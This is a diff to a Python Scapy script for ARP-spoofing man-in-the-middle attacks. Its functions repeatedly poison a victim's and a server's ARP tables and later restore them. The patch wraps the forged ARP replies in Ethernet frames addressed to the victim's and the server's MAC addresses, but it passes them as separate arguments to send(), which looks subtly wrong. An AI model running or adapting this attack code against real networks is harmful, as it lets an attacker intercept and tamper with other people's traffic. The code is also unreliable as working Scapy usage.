@@ -37,8 +37,8 @@ def MIMspoofARP(ipVictim, ipServer):
     try:
         while(True):
 #             print("Poisoning Arp table")
-            send(arp1, verbose=False)
-            send(arp2, verbose=False)
+            send(Ether(dst=macServer), arp1, verbose=False)
+            send(Ether(dst=macVictim), arp2, verbose=False)
             time.sleep(2)
     except KeyboardInterrupt:
         undoARPSpoof(ipVictim, ipServer, macVictim, macServer)
@@ -48,8 +48,8 @@ def undoARPSpoof(ipVictim, ipServer, macVictim, macServer):
     undoVictim = ARP(hwsrc=macVictim, psrc=ipVictim, hwdst=macServer, pdst=ipServer)
     undoServer = ARP(hwdst=macVictim, pdst=ipVictim, hwsrc=macServer, psrc=ipServer)
 
-    send(undoVictim, count=4, verbose=False)
-    send(undoServer, count=4, verbose=False)
+    send(Ether(dst=macVictim), undoVictim, count=4, verbose=False)
+    send(Ether(dst=macServer), undoServer, count=4, verbose=False)
 
 def prepPacket(targetMAC, targetIP, spoofedIP):
     arp1 = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofedIP)
